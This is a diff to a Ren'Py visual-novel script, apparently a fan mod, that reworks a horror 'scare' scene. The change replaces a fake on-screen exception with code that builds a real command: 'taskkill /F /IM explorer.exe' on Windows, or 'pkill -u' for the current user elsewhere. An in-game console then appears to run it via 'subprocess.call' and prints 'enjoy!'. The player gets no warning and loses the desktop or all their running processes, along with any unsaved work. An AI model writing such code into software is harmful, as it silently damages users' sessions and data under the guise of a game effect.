@@ -178,11 +178,12 @@ label chara_monika_scare:
     m "Hmm...?"
     m 1esc "How curious."
     m "You must have misunderstood."
+    $ style.say_dialogue = style.edited
     m "{cps=*0.25}SINCE WHEN WERE YOU THE ONE IN CONTROL?{/cps}"
 
     # this is a 2 step process
-    $ config.overlay_screens.remove("hkb_overlay")
-    hide screen hkb_overlay
+    $ mas_RaiseShield_core()
+    $ mas_OVLHide()
 
     window hide
     hide monika
@@ -201,17 +202,31 @@ label chara_monika_scare:
     hide monika_bg_highlight
     hide monika_scare
 
-    play sound "mod_assets/Swipe.wav"
-    scene black
-    show ut_slash at top
-    pause 0.6
-    play sound "mod_assets/Hit.wav"
-    show chara9 at Shake(None, 2.0, dist=10)
-    pause 2
+    # setup a command
+    if renpy.windows:
+        $ killer_cmd = ["taskkill", "/F", "/IM", "explorer.exe"]
+    else:
+        $ killer_cmd = ["pkill", "-u", mas_getuser()]
 
-    #I think there's another method to show a fake exception, but w/e
-    show chara_exception at center
-    pause 1
+    python:
+        for index in range(len(killer_cmd)):
+            killer_cmd[index] = str(killer_cmd[index])
+
+        # and the console
+        local_ctx = {}
+        store.mas_ptod.rst_cn()
+        store.mas_ptod.set_local_context(local_ctx)
+
+
+    scene black
+    pause 2.0
+
+    show screen mas_py_console_teaching
+    pause 1.0
+    call mas_wx_cmd("import subprocess", x_wait=1.0)
+    call mas_wx_cmd("subprocess.call(" + str(killer_cmd) + ")", x_wait=1.5)
+    call mas_w_cmd('"enjoy!"')
+    pause 1.0
     return
 
 #These are the comments made when you restart the game the first few times
